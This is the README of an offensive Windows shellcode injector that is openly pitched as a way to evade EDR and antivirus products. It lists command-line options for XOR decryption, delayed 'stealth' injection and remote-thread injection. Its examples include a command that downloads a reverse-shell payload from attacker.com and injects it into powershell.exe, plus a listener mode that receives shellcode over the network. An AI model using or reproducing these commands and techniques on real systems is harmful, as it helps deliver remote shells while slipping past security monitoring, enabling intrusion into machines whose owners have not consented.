# Windows NTAPI shellcode injector
Inject shellcode from memory to process using Windows NTAPI for bypassing EDRs and Antiviruses
- Download shellcode from URL
- Listen and wait for shellcode

## Usage

```shell
Usage:
        Injector.exe -u <URL>
        Injector.exe -p <PID/Process Name> -u <URL>
        Injector.exe -p <PID/Process Name> -l <LISTEN_PORT>
        Injector.exe -h
Options:
        -h       Show this menu.
        -u       URL to donwload shellcode from (Not listen mode).
        -p       PID/Process name to be injected (Optional).
        -l       Listen mode port (Not download mode).
        -k       XOR key to use for decryption.
        -s       Stealth mode - the decryption and injection will start after given seconds (Default 18).
        -m       Injection mode - NT or normal(VirtualAllocEx, WriteProcessMemory, CreateRemoteThread).
```

## Examples

Download and inject to powershell.exe
```shell
injector.exe -u http://attacker.com/reverse_shell.bin -p powershell.exe
```

Wait for connection on port 8080, receive shellcode and inject to owned notepad.exe
```shell
injector.exe -l 8080
```

 
